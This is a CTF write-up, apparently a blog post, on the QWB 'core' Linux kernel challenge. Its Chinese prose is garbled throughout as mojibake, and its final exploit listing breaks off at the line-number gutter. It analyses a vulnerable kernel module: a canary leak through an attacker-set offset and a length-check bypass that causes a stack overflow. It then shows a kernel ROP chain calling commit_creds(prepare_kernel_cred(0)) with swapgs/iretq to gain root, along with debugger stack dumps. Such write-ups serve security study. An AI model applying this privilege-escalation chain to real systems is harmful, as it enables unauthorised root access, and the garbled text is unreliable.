pwnè€Œè¨€æˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯ææƒï¼ˆå¾—åˆ°ä¸€ä¸ªrootæƒé™çš„è¿›ç¨‹ï¼‰ã€‚æŒ–æ˜å‡ºå­˜åœ¨äºkernelæ¨¡å—é‡Œçš„æ¼æ´å¹¶é€šè¿‡ç”¨æˆ·æ€çš„ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨è¿›åˆ°å†…æ ¸æ€ä¸­å»è§¦å‘æ¼æ´ä»è€Œåˆ°è¾¾ææƒçš„ç›®çš„ã€‚<br>ç›´æ¥æ’¸é¢˜âœ”<br>è§£å‹ä¹‹åå¯ä»¥çœ‹åˆ°è¿™äº›æ–‡ä»¶ï¼š<br>bzImageï¼šå‹ç¼©åçš„å†…æ ¸é•œåƒ<br>vmlinuxï¼šç¼–è¯‘å‡ºçš„åŸå§‹å†…æ ¸æ–‡ä»¶ï¼Œæ²¡æœ‰è¢«å‹ç¼©è€Œä¸”æ˜¯é™æ€è¿æ¥çš„ã€‚<br>.shï¼šqemuçš„å¯åŠ¨è„šæœ¬<br>.cpioï¼šæ‰“åŒ…åçš„æ–‡ä»¶ç³»ç»Ÿ</p><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸‹.shæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸‹å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-m æŒ‡å®šå†…å­˜(RAM)å¤§å°</span><br><span class="line">-kernel æŒ‡å®šå†…æ ¸é•œåƒ</span><br><span class="line">-initrd æŒ‡å®šå†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">-qppend é™„åŠ é€‰é¡¹ æŒ‡å®šno kaslrå¯ä»¥å…³é—­åœ°å€éšæœºåŒ–</span><br><span class="line">-s ç›¸å½“äº-gdb tcp::1234ï¼Œå¯ä»¥ç”¨gdb ./vmlinuxè°ƒè¯•</span><br><span class="line">-smp ç”¨äºå£°æ˜æ‰€æœ‰å¯èƒ½ç”¨åˆ°çš„cpus, i.e. sockets cores threads = maxcpus.</span><br><span class="line">-cpu è®¾ç½®CPUçš„å®‰å…¨é€‰é¡¹</span><br></pre></td></tr></table></figure><p>ä¿æŠ¤æœºåˆ¶ï¼š<br>å¸¸è§çš„æœ‰kaslrï¼ˆåœ°å€éšæœºåŒ–ï¼‰ï¼Œsmep(å†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç )ï¼Œsmap(å†…æ ¸æ€ä¸å¯è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®)ã€‚</p><p>è§£é¢˜è¿‡ç¨‹ï¼š<br>æ‹¿åˆ°è¿™äº›æ–‡ä»¶åé¦–å…ˆè¦åšçš„å°±æ˜¯è§£åŒ….cpioæ–‡ä»¶ï¼Œä½†ä¸è¦åœ¨å…±äº«æ–‡ä»¶å¤¹ä¸‹è¿›è¡Œæ­¤æ“ä½œï¼Œä¼šå¯¼è‡´è§£åŒ…çš„è½¯é“¾æ¥å‡ºé”™ã€‚æˆ‘ä¸€èˆ¬æ˜¯è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp give_to_player /home/an9ela/kernel</span><br><span class="line">cd /home/an9ela/kernel/give_to_player</span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio core.cpio.gz</span><br><span class="line">mv core.cpio.gz ./core</span><br><span class="line">cd core</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpiow  //è§£åŒ…æ“ä½œ</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ../core.cpio //æ‰“åŒ…æ“ä½œï¼Œè¿™é¢˜ç»™äº†gen_cpio.shç›´æ¥./gen_cpio core.cpio</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿä¹‹åé¦–å…ˆè¦çœ‹çš„å°±æ˜¯Initæ–‡ä»¶äº†ï¼Œè¿™ä¸ªæ˜¯åˆå§‹åŒ–å†…æ ¸æ—¶æ‰€è¿›è¡Œçš„æ“ä½œâ€œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms    //å¤‡ä»½äº†kallsymsåˆ°tmpæ–‡ä»¶å¤¹ä¸‹</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict  //å³æˆ‘ä»¬ä¸èƒ½é€šè¿‡/proc/kallsymsè·å¾—å‡½æ•°åœ°å€ï¼Œä½†/tmp/kallsymsæ˜¯ä¸å—å½±å“çš„</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict //æ— æ³•é€šè¿‡dmesgæŸ¥çœ‹å†…æ ¸çš„è¾“å‡º</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko    //æ’å…¥core.koæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¹Ÿå³æˆ‘ä»¬è¦é‡ç‚¹åˆ†æçš„æ¨¡å—</span><br><span class="line">poweroff -d 120 -f &amp;  //è¿™å¥è®¾ç½®äº†120sè‡ªåŠ¨å…³æœºï¼Œä¸ºä¸å½±å“è°ƒè¯•å¯ä»¥åˆ æ‰</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh   //æˆ‘ä»¬çš„shellçš„uidgidä¸º1000ï¼Œrootä¸º0</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦åˆ†æcore.koæ¨¡å—äº†ï¼Œå¯ä»¥ç”¨idaæ‰“å¼€ã€‚<br>é¦–å…ˆæŸ¥çœ‹init_moduleå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨æ¨¡å—åŠ è½½æ—¶æ‰§è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è°ƒç”¨proc_createåˆ›å»ºäº†åä¸ºcoreçš„è™šæ‹Ÿæ–‡ä»¶ï¼Œåº”ç”¨å±‚é€šè¿‡è¯»å†™æ”¹æ–‡ä»¶å®ç°ä¸å†…æ ¸çš„äº¤äº’ã€‚<br>å…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°file_operationså­˜å‚¨äº†å†…æ ¸æ¨¡å—æä¾›çš„å¯¹è®¾å¤‡è¿›è¡Œå„ç§æ“ä½œçš„å‡½æ•°æŒ‡é’ˆï¼Œå¯¹äºç”¨æˆ·æ€è€Œè¨€ä¹Ÿå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡coreæ–‡ä»¶èƒ½è¿›è¡Œé‚£äº›æ“ä½œã€‚<br>ç‚¹è¿›å»fop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000438                 dq offset core_write</span><br><span class="line">.data:0000000000000468                 dq offset core_ioctl</span><br><span class="line">.data:0000000000000498                 dq offset core_release</span><br></pre></td></tr></table></figure><p>å¯è§èƒ½æ‰§è¡Œçš„æ“ä½œä¸ºwrite,ioctl,release</p><p>æ¥ä¸‹æ¥æ˜¯core_ioctlå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line"></span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int ioctl(int fd, ind cmd, â€¦);æ˜¯è®¾å¤‡é©±åŠ¨ç¨‹åºä¸­å¯¹è®¾å¤‡çš„ioé€šé“è¿›è¡Œç®¡ç†çš„å‡½æ•°ã€‚å…¶ä¸­fdæ˜¯ç”¨æˆ·ç¨‹åºæ‰“å¼€è®¾å¤‡æ—¶ä½¿ç”¨openå‡½æ•°è¿”å›çš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œcmdæ˜¯ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ã€‚<br>ioctlæ˜¯æ–‡ä»¶ç»“æ„ä¸­çš„ä¸€ä¸ªå±æ€§åˆ†é‡ï¼Œå¦‚æœä½ çš„é©±åŠ¨ç¨‹åºæä¾›äº†å¯¹ioctlçš„æ”¯æŒï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨ç”¨æˆ·ç¨‹åºä¸­ä½¿ç”¨ioctlå‡½æ•°å®ç°å¯¹è®¾å¤‡ioé€šé“çš„æ§åˆ¶ã€‚<br>æ„æ€å°±æ˜¯å¦‚æœlkmä¸­æä¾›äº†ioctlåŠŸèƒ½ï¼ˆæ¯”å¦‚ä¸Šé¢çš„è¿™ä¸ªå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”å®ç°äº†å¯¹åº”æŒ‡ä»¤çš„æ“ä½œï¼Œé‚£ä¹ˆåœ¨ç”¨æˆ·æ€ä¸­ï¼Œé€šè¿‡è¿™ä¸ªé©±åŠ¨ç¨‹åºï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ioctlå‡½æ•°æ¥ç›´æ¥è°ƒç”¨æ¨¡å—ä¸­çš„æ“ä½œã€‚</p><p>è€Œè¿™é‡Œå°±æä¾›äº†ioctlåŠŸèƒ½ï¼Œç»§ç»­åˆ†æcore_read()ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="type">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>  copy_to_user()å‡½æ•°ä¸­å°†v5+offä¸­çš„0x40é•¿åº¦çš„æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå…¶ä¸­offæ˜¯bssä¸Šçš„å…¨å±€å˜é‡ã€‚<br>  è€Œcase 0x6677889Cå°±ç»™äº†æˆ‘ä»¬æ§åˆ¶offçš„æœºä¼šï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨é€šè¿‡æ§åˆ¶off&#x3D;0x40æ¥leak canaryã€‚</p><p>  core_copy_funcå‡½æ•°ï¼š<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  __int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é¦–å…ˆå¯¹é•¿åº¦è¿›è¡Œäº†æ£€æŸ¥ï¼Œä½†æ³¨æ„æ•°æ®ç±»å‹ï¼Œa1ä¸ºint64ï¼Œè€Œåœ¨qmemcpyå‡½æ•°é‡Œç±»å‹äº†uint16ï¼Œå› æ­¤æˆ‘ä»¬è®¾è®¡a1ä¸º0xffffffff00000000|(real_len)ä½¿int64ä¸ºè´Ÿæ•°ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥çš„åŒæ—¶é€ æˆæº¢å‡ºã€‚</p><p>è¿™æ ·åˆ†æä¸‹æ¥åˆ©ç”¨æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼š<br>å…ˆåˆ©ç”¨core_read()æ³„éœ²canaryï¼Œä¹‹åå†åˆ©ç”¨core_cpoy_funcåœ¨å†…æ ¸æ ˆé‡Œæ„é€ ropï¼Œä½¿å…¶åœ¨å†…æ ¸æ€æ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ä½¿å¾—è¿›ç¨‹çš„uidgid&#x3D;0ï¼Œç„¶åè¿”å›åˆ°ç”¨æˆ·æ€æ‰§è¡Œsystem(â€œ&#x2F;bin&#x2F;sh)ä»è€Œå®Œæˆææƒã€‚</p><p>éš¾ç‚¹åœ¨äºropçš„æ„é€ ã€‚<br>å¯¹äºæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))æ¥è¯´ï¼Œä¼ å‚å’Œç”¨æˆ·æ€çš„ä¸€è‡´ï¼Œä½†è¦æ³¨æ„commit_creds()çš„å‚æ•°æ˜¯prepare_kernel_cred(0)å‡½æ•°çš„è¿”å›å€¼ã€‚<br>ä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€æ—¶è¦ç”¨åˆ°æ¡æŒ‡ä»¤swapgså’Œiretqã€‚åœ¨æ‰§è¡Œiretqä¹‹å‰ï¼Œæ‰§è¡ŒswapgsæŒ‡ä»¤ã€‚è¯¥æŒ‡ä»¤é€šè¿‡ç”¨ä¸€ä¸ªMSRä¸­çš„å€¼äº¤æ¢GSå¯„å­˜å™¨çš„å†…å®¹ï¼Œç”¨æ¥è·å–æŒ‡å‘å†…æ ¸æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼Œç„¶åæ‰èƒ½æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹ç±»çš„å†…æ ¸ç©ºé—´ç¨‹åºã€‚</p><p>iret(ç‰¹æƒè¿”å›)æŒ‡ä»¤ä»å†…æ ¸ç©ºé—´è¿”å›åˆ°ç”¨æˆ·ç©ºé—´è¿›ç¨‹ã€‚ä½†æ˜¯iret(64ä½ä¸‹ä¸ºiretq)æœŸæœ›çš„ç‰¹å®šçš„å †æ ˆå¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| iretq_ret            |</span><br><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure><p>æ–°çš„ç”¨æˆ·ç©ºé—´æŒ‡ä»¤æŒ‡é’ˆ(RIP)ï¼Œç”¨æˆ·ç©ºé—´å †æ ˆæŒ‡é’ˆ(RSP)ï¼Œä»£ç å’Œå †æ ˆæ®µé€‰æ‹©å™¨(CSå’ŒSS)ä»¥åŠå…·æœ‰å„ç§çŠ¶æ€ä¿¡æ¯çš„EFLAGSå¯„å­˜å™¨ã€‚<br>ä¸€èˆ¬æˆ‘ä»¬ç”¨ä»¥ä¸‹çš„æ‰©å±•å†…è”æ±‡ç¼–è·å¾—æ‰€éœ€çš„å¯„å­˜å™¨çš„å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)    <span class="comment">//output</span></span><br><span class="line">       :                                                        <span class="comment">//input</span></span><br><span class="line">       :<span class="string">&quot;memory&quot;</span>                                               <span class="comment">//list of clobbered registerså³æ”¹å˜çš„å†…å®¹</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ropï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000â”‚ rsp  0xffffa47a800e7e60 â€”â–¸ 0x7ffec40e5570 â—‚â€” add    byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */</span><br><span class="line">01:0008â”‚      0xffffa47a800e7e68 â€”â–¸ 0xffffffffb2200b2f â—‚â€” pop    rdi /* 0x722540358b4cc35f */</span><br><span class="line">02:0010â”‚      0xffffa47a800e7e70 â—‚â€” 0</span><br><span class="line">03:0018â”‚      0xffffa47a800e7e78 â€”â–¸ 0xffffffffb229cce0 â—‚â€” push   rbp /* 0x153d8b48fd894855 */</span><br><span class="line">04:0020â”‚      0xffffa47a800e7e80 â€”â–¸ 0xffffffffb2221e53 â—‚â€” pop    rcx /* 0xffdf89480127c359 */</span><br><span class="line">05:0028â”‚      0xffffa47a800e7e88 â€”â–¸ 0xffffffffb229c8e0 â—‚â€” push   r12 /* 0x4025248b4c655441 */</span><br><span class="line">06:0030â”‚      0xffffa47a800e7e90 â€”â–¸ 0xffffffffb23ae978 â—‚â€” mov    rdi, rax /* 0xc28ee9e1ffc78948 */</span><br><span class="line">07:0038â”‚      0xffffa47a800e7e98 â€”â–¸ 0xffffffffb2c012da â—‚â€” swapgs  /* 0x485590c39df8010f */</span><br><span class="line">08:0040â”‚      0xffffa47a800e7ea0 â—‚â€” 0</span><br><span class="line">09:0048â”‚      0xffffa47a800e7ea8 â€”â–¸ 0xffffffffb2250ac2 â—‚â€” iretq   /* 0x1f0f2e6690c3cf48 */</span><br><span class="line">0a:0050â”‚      0xffffa47a800e7eb0 â€”â–¸ 0x400eac â—‚â€” push   rbp</span><br><span class="line">0b:0058â”‚      0xffffa47a800e7eb8 â—‚â€” 0x33 /* &#x27;3&#x27; */</span><br><span class="line">0c:0060â”‚      0xffffa47a800e7ec0 â—‚â€” 0x282</span><br><span class="line">0d:0068â”‚      0xffffa47a800e7ec8 â€”â–¸ 0x7ffec40e45c0 â—‚â€” 0</span><br><span class="line">0e:0070â”‚      0xffffa47a800e7ed0 â—‚â€” 0x2b /* &#x27;+&#x27; */</span><br><span class="line">0f:0078â”‚      0xffffa47a800e7ed8 â—‚â€” 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(ptr + i++) = canary;</span><br><span class="line">*(ptr + i++) = rbp;</span><br><span class="line">*(ptr + i++) = prdi_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">*(ptr + i++) = prcx_ret;</span><br><span class="line">*(ptr + i++) = commit_creds;</span><br><span class="line">*(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">*(ptr + i++) = swapgs_p_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = iretq_ret;</span><br><span class="line">*(ptr + i++) = (uint64_t) launch_shell;</span><br><span class="line">*(ptr + i++) = tf.cs;</span><br><span class="line">*(ptr + i++) = tf.rflags;</span><br><span class="line">*(ptr + i++) = tf.rsp;</span><br><span class="line">*(ptr + i++) = tf.ss;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 